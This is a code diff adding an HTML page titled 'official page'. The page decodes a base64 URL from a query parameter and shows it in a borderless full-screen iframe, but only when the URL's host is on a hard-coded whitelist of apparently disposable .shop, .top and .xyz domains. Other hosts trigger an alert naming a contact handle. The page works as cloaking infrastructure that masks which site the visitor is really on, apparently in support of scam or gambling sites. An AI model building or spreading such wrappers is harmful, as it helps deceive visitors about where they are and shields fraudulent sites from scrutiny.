@@ -1,0 +1,177 @@
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport" />
+    <meta content="yes" name="apple-mobile-web-app-capable" />
+    <meta content="yes" name="apple-touch-fullscreen" />
+    <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+    <meta content="320" name="MobileOptimized" />
+    <title>官方页面</title>
+    <style>
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+      }
+
+      .frame {
+        position: fixed;
+        inset: 0;
+        height: 100%;
+        width: 100%;
+        overflow: hidden;
+        background: #fff;
+      }
+
+      .content {
+        position: absolute;
+        inset: 0;
+        height: 100%;
+        width: 100%;
+        border: 0;
+        background: #fff;
+        display: block;
+        transform: translateZ(0);
+      }
+    </style>
+    <style type="text/css" id="__via_marker__"></style>
+  </head>
+  <body>
+    <script>
+      ;(function () {
+        try {
+          var urlParams = new URLSearchParams(window.location.search)
+          var encodedParam = urlParams.get('bd')
+          if (!encodedParam) return
+          var decoded = decodeURIComponent(encodedParam)
+          var tureurl = atob(decoded)
+          if (!tureurl) return
+          if (tureurl.indexOf('http') !== 0) return
+
+          var urlObj = new URL(tureurl)
+          var domain = urlObj.hostname
+          var allowedDomains = [
+            'bandao6.shop',
+            'pk.660013.xyz',
+            'adfca.shop',
+            'plplq.shop',
+            'oklvip.shop',
+            'okokokl.shop',
+            'qingshui.tirlc.cn',
+            'xx.2091xi.top',
+            'etkmfd.ink',
+            'qjx.xkvm.top',
+          ]
+          var isAllowed = allowedDomains.some(function (allowedDomain) {
+            return domain === allowedDomain || domain.endsWith('.' + allowedDomain)
+          })
+          if (!isAllowed) {
+            alert('请联系黑夜加白@hxzc_heiye')
+            return
+          }
+
+          var frame = document.createElement('div')
+          frame.className = 'frame'
+          document.body.appendChild(frame)
+
+          var ifr = document.createElement('iframe')
+          ifr.className = 'content'
+          ifr.setAttribute('frameborder', '0')
+          ifr.setAttribute('scrolling', 'auto')
+          ifr.src = 'about:blank'
+          frame.appendChild(ifr)
+
+          function nudge() {
+            try {
+              ifr.style.opacity = '0.99'
+              void ifr.offsetHeight
+              ifr.style.opacity = '1'
+            } catch (e) {}
+          }
+
+          function layout() {
+            try {
+              var vv = window.visualViewport
+              if (!vv) return
+              frame.style.width = vv.width + 'px'
+              frame.style.height = vv.height + 'px'
+              frame.style.left = vv.offsetLeft + 'px'
+              frame.style.top = vv.offsetTop + 'px'
+            } catch (e) {}
+          }
+
+          ifr.addEventListener('load', function () {
+            layout()
+            setTimeout(nudge, 0)
+            setTimeout(nudge, 300)
+            try {
+              bindMouseWhee(ifr)
+            } catch (e) {}
+          })
+
+          if (window.visualViewport) {
+            window.visualViewport.addEventListener('resize', function () {
+              layout()
+              setTimeout(nudge, 0)
+            })
+            window.visualViewport.addEventListener('scroll', function () {
+              layout()
+            })
+          }
+
+          window.addEventListener('resize', function () {
+            layout()
+            setTimeout(nudge, 0)
+          })
+
+          document.addEventListener('visibilitychange', function () {
+            if (!document.hidden) {
+              layout()
+              setTimeout(nudge, 0)
+            }
+          })
+          window.addEventListener('focus', function () {
+            layout()
+            setTimeout(nudge, 0)
+          })
+          window.addEventListener('pageshow', function () {
+            layout()
+            setTimeout(nudge, 0)
+          })
+
+          requestAnimationFrame(function () {
+            layout()
+            ifr.src = tureurl
+          })
+        } catch (e) {}
+      })()
+    </script>
+    <script>
+      var firefox = navigator.userAgent.indexOf('Firefox') != -1
+      function MouseWheel(e, doc) {
+        e.preventDefault && e.preventDefault()
+        e.returnValue = false
+        var up = (firefox && e.detail < 0) || e.wheelDelta > 0
+        doc.body.scrollTop = doc.documentElement.scrollTop += up ? -50 : 50
+      }
+      function bindMouseWhee(ifr) {
+        try {
+          var doc = ifr.contentWindow.document
+          firefox
+            ? doc.addEventListener(
+                'DOMMouseScroll',
+                function (e) {
+                  MouseWheel(e, doc)
+                },
+                false,
+              )
+            : (doc.onmousewheel = function (e) {
+                MouseWheel(e || ifr.contentWindow.event, doc)
+              })
+        } catch (e) {}
+      }
+    </script>
+  </body>
+</html>
